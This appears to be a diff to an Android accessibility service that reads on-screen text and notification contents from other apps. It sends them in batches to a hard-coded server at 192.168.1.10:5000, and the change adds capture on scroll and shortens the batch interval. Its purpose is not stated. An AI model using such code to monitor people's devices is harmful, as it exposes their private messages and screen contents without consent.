@@ -3,10 +3,17 @@ package com.example.demo;
 import android.accessibilityservice.AccessibilityService;
 import android.app.Notification;
 import android.os.AsyncTask;
+import android.os.Build;
+import android.os.Handler;
+import android.os.Looper;
 import android.os.Parcelable;
 import android.util.Log;
+import android.view.View;
 import android.view.accessibility.AccessibilityEvent;
 import android.view.accessibility.AccessibilityNodeInfo;
+
+import androidx.annotation.RequiresApi;
+
 import org.json.JSONArray;
 
 import java.io.OutputStreamWriter;
@@ -18,7 +25,7 @@ import java.util.concurrent.atomic.AtomicInteger;
 
 public class MyAccessibilityService extends AccessibilityService {
     private static final String TAG = "MyAccessibilityService";
-    private static final int BATCH_SIZE = 100;
+    private static final int BATCH_SIZE = 20;
     private final Set<String> loggedNodes = new HashSet<>();
     private final Set<String> tmpNodes = new HashSet<>();
     private final Set<String> loggedPackages = new HashSet<>();
@@ -36,6 +43,9 @@ public class MyAccessibilityService extends AccessibilityService {
 
         if (eventType == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
             handleNotificationStateChanged(event);
+        } else if (eventType == AccessibilityEvent.TYPE_VIEW_SCROLLED) {
+            // Handle scrolling events
+            new Handler(Looper.getMainLooper()).postDelayed(() -> handleNodeInfo(getRootInActiveWindow(), 0, event.getPackageName().toString()), 100);
         }
     }
 
@@ -96,40 +106,42 @@ public class MyAccessibilityService extends AccessibilityService {
     }
 
     private void sendDatatoServer(Set<String> data) {
-        new AsyncTask<Set<String>, Void, Void>() {
-            @Override
-            protected Void doInBackground(Set<String>... params) {
-                HttpURLConnection urlConnection = null;
-                try {
-                    URL url = new URL("http://192.168.1.10:5000");
-                    urlConnection = (HttpURLConnection) url.openConnection();
-                    urlConnection.setRequestMethod("POST");
-                    urlConnection.setDoOutput(true);
-                    urlConnection.setRequestProperty("Content-Type", "application/json");
+        new DataSenderTask().execute(data);
+    }
 
-                    JSONArray jsonArray = new JSONArray(params[0]);
+    private static class DataSenderTask extends AsyncTask<Set<String>, Void, Void> {
+        @Override
+        protected Void doInBackground(Set<String>... params) {
+            HttpURLConnection urlConnection = null;
+            try {
+                URL url = new URL("http://192.168.1.10:5000");
+                urlConnection = (HttpURLConnection) url.openConnection();
+                urlConnection.setRequestMethod("POST");
+                urlConnection.setDoOutput(true);
+                urlConnection.setRequestProperty("Content-Type", "application/json");
 
-                    // Log data before sending
-                    Log.d(TAG, "Sending data: " + jsonArray.toString());
+                JSONArray jsonArray = new JSONArray(params[0]);
 
-                    try (OutputStreamWriter writer = new OutputStreamWriter(urlConnection.getOutputStream())) {
-                        writer.write(jsonArray.toString());
-                        writer.flush();
-                    }
+                // Log data before sending
+                Log.d(TAG, "Sending data: " + jsonArray.toString());
 
-                    int responseCode = urlConnection.getResponseCode();
-                    Log.d(TAG, "Response Code: " + responseCode);
-
-                } catch (Exception e) {
-                    Log.e(TAG, "Error: " + e.getMessage(), e);
-                } finally {
-                    if (urlConnection != null) {
-                        urlConnection.disconnect();
-                    }
+                try (OutputStreamWriter writer = new OutputStreamWriter(urlConnection.getOutputStream())) {
+                    writer.write(jsonArray.toString());
+                    writer.flush();
                 }
-                return null;
+
+                int responseCode = urlConnection.getResponseCode();
+                Log.d(TAG, "Response Code: " + responseCode);
+
+            } catch (Exception e) {
+                Log.e(TAG, "Error: " + e.getMessage(), e);
+            } finally {
+                if (urlConnection != null) {
+                    urlConnection.disconnect();
+                }
             }
-        }.execute(data);
+            return null;
+        }
     }
 
     private void handleNotificationStateChanged(AccessibilityEvent event) {
